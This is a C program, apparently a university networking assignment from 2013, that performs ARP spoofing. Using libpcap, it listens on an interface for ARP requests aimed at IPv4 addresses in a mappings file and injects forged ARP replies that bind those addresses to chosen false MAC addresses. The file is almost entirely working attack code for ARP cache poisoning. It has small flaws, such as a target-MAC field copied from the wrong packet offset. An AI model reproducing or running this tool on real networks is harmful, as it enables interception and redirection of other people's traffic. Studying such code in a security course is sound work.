/* 
Chad Cahill
EECE 555
Fall 2013
*/

#include <pcap/pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>

struct data {
  u_char IPv4[4];
  u_char MAC[6];
};

int count_lines(FILE *pFile);

int parse(FILE *pFile, struct data mappings[], int lines);

void spoof(u_char *spoofPacket, const u_char *packet_data, u_char *mappedMAC, u_char *mappedIPv4);

int main(int argc, char *argv[]) {

	char pcap_buff[PCAP_ERRBUF_SIZE];       /* Error buffer used by pcap functions */
	pcap_t *pcap_handle = NULL;             /* Handle for PCAP library */
	struct pcap_pkthdr *packet_hdr = NULL;  /* Packet header from PCAP */
	const u_char *packet_data = NULL;       /* Packet data from PCAP */
	int ret = 0;                            /* Return value from library calls */
	char *dev_name = NULL;                  /* Device name for live capture */
  char *file_name = NULL;                 /* File with IPv4 to Ethernet mappings */
  char debug = 0;                         /* Flag to run program in debug mode */
  u_char spoofPacket[42];                 /* Packet containing spoofed ARP reply */
  int lines = 0;                          /* Number of lines in file */

	/* Check command line arguments */
  if ((argc == 3) || (argc == 4)) { 
    if (argc == 4) { // debug mode
      debug = 1;
    }
    dev_name = argv[1];
    file_name = argv[2];
  }
  else if ((argc > 4) || (argc < 3)) { 
    /* Wrong number of command line arguments */
    fprintf(stderr, "error: check command line arguments\n");
  }

  /* open addresses file */
  FILE *pFile;
  pFile = fopen (file_name, "r");
  if (pFile == NULL) {
    fprintf(stderr, "error: opening file\n");
    return -1;
  }

  lines = count_lines(pFile);

  struct data mappings[lines]; /* Array of structs to store IPv4 to MAC mappings */

  if ((parse(pFile, mappings, lines)) == -1) {
    fprintf(stderr, "error: parse()\n");
    return -1;
  }

	/* Lookup and open the specified device */
 
	pcap_handle = pcap_open_live(dev_name, BUFSIZ, 1, 0, pcap_buff);
  if (pcap_handle == NULL) {
    fprintf(stderr, "Error opening capture device %s: %s\n", dev_name, pcap_buff);
		return -1;
  }
  if (debug) {
	  printf("Capturing on interface '%s'\n", dev_name);
  }

	ret = pcap_next_ex(pcap_handle, &packet_hdr, &packet_data);
	while( ret != -2 ) {

		/* An error occurred */
		if( ret == -1 ) {
			pcap_perror(pcap_handle, "Error processing packet:");
			pcap_close(pcap_handle);
			return -1;
		}

		/* Unexpected return values; other values shouldn't happen when reading trace files */
		else if( ret != 1 ) {
			fprintf(stderr, "Unexpected return value (%i) from pcap_next_ex()\n", ret);
			pcap_close(pcap_handle);
			return -1;
		}

		/* Process the packet */
		else {
      if (
        packet_data[16] == 0x08 && packet_data[17] == 0x00 // ARP protocol
        && packet_data[20] == 0x00 && packet_data[21] == 0x01 // ARP request
        ) {
        if (debug) {
        printf("this packet is an ARP REQUEST\n");
        }
        int i = 0;
        for (i = 0; i < lines; i ++) {
          if (memcmp(packet_data + 38, mappings[i].IPv4, 4) == 0) {
            if (debug) {
            printf("this packet is an ARP REQUEST for an ipv4 address in the mappings file\n");
            }

            /* generate ARP spoof reply packet */
            spoof(spoofPacket, packet_data, mappings[i].MAC, mappings[i].IPv4);

            /* inject spoofed ARP reply packet */
            if (pcap_inject(pcap_handle, spoofPacket, 42) == -1) {
              fprintf(stderr, "error: pcap inject\n");
              return -1;
            }
          }
        }
      }
		}

		/* Get the next packet */
		ret = pcap_next_ex(pcap_handle, &packet_hdr, &packet_data);
	}

	/* Close the trace file or device */
	pcap_close(pcap_handle);
	return 0;
}

/* 
  inputs: file pointer
  return value: number of lines in file as integer
  description: count_lines() counts the number of lines in a file
*/
int count_lines(FILE *pFile) {
  /* Count number of lines in address file */
  int lines = 0;
  int ch = 0;

  while (EOF != (ch=fgetc(pFile)))
    if (ch == '\n')
      lines++;

  rewind(pFile);
  return lines;
}

/*
  inputs: file pointer, array of structs, number of lines in file
  return value: 0 is returned upon success, -1 returned upon error
  description: parse() reads through a file and places IPv4 to MAC mappings
    in each element of the array of structs
*/
int parse(FILE *pFile, struct data mappings[], int lines) {
  char one_line[34];
  struct ether_addr *ea;

  int j = 0;
  for (j = 0; j < lines; j++) {

    fgets(one_line, 34, pFile); /* read one line of the file */

    int i = 0;
    for (i = 0; i < sizeof(one_line); i++) {
      if ('\t' == one_line[i]) {
        /* tab found at character number i */
        one_line[i] = '\0';
        break;
      }
    }
    /* Ensure the IPv4 address is valid */
    /* Place IPv4 address in mappings struct */
    if (inet_pton(AF_INET, one_line, mappings[j].IPv4) == 0) {
      printf("error: invalid IPv4 address\n");
      return -1;
    }

    strtok(one_line, "\n"); /* Remove newline character */
    
    /* Ensure the MAC address is valid */
    if ((ea = ether_aton(one_line + i + 1)) == NULL) {
      printf("error: invalid MAC address\n");
      return -1;
    }

    memcpy(mappings[j].MAC, ea, 6); /* Place MAC address in mappings struct */
  }
  fclose(pFile);
  return 0;
}

/*
  inputs: spoofed packet, current packet data, mapped MAC address ,requested IPv4 address
  return value: spoof() is a void function with no return value
  description: spoof() builds a complete packet that is an ARP REPLY to lead
    other machines to believe that certain IPv4 addresses are mapped to false
    MAC addresses
*/
void spoof(u_char *spoofPacket, const u_char *packet_data, u_char *mappedMAC, u_char *mappedIPv4) {

  // spoof packet's MAC DST is current packet's MAC SRC
  memcpy(spoofPacket, packet_data + 6, 6);

  // spoof packet's MAC SRC is mapped MAC for appropriate IPv4 address
  memcpy(spoofPacket + 6, mappedMAC, 6);

  // spoof packet's TYPE/LENGTH is 0x0806
  spoofPacket[12] = 0x08;
  spoofPacket[13] = 0x06;

  // spoof packet's HARDWARE TYPE is 0x0001
  spoofPacket[14] = 0x00;
  spoofPacket[15] = 0x01;

  // spoof packet's PROTOCOL TYPE is 0x0800
  spoofPacket[16] = 0x08;
  spoofPacket[17] = 0x00;

  // spoof packet's Hardware length is 6 bytes
  spoofPacket[18] = 6;

  // spoof packet's Protocol length is 4 bytes
  spoofPacket[19] = 4;

  // spoof packet's OPERATION is 0x0002 (reply)
  spoofPacket[20] = 0x00;
  spoofPacket[21] = 0x02;

  // spoof packet's MAC SRC is the mapped MAC addr for appropriate IPv4 addr
  memcpy(spoofPacket + 22, mappedMAC, 6);

  // spoof packet's SRC IP is the mapped IPv4 addr for appropriate MAC addr
  memcpy(spoofPacket + 28, mappedIPv4, 4);

  // spoof packet's MAC DST is the current packet's MAC SRC
  memcpy(spoofPacket + 32, packet_data + 8, 6);

  // spoof packet's DST IP is the current packet's SRC IP
  memcpy(spoofPacket + 38, packet_data + 28, 4);

  return;
}
